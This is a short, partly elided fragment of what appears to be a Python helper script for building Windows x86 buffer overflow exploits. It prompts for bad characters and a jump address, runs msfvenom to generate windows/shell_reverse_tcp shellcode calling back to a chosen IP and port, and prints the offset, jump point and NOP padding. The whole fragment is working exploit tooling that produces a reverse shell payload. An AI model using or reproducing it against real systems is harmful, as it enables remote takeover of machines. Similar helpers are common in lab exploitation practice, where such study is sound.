...
print("Follow the ESP Dump and examine for bad characters")
print("")
print("i.e. /x00/x07/x08 (reverse the / )")
real_bad_chars = raw_input("What are the bad characters? ")
...
print("")
print("i.e. /xaf/x11/x50/x62 (reverse the / )")
...
gen_shellcode = os.system('msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} EXITFUNC=thread -b "{bad}" -f c -a x86 > shellcode.txt 2>/dev/null'.format(ip=your_ip, port=your_port, bad=real_bad_chars))
...
print("Summary")
print("")
print("offset = " + find_offset_len)
print("jump_point = " + jump_point)
print("padding = /x90 * 32")
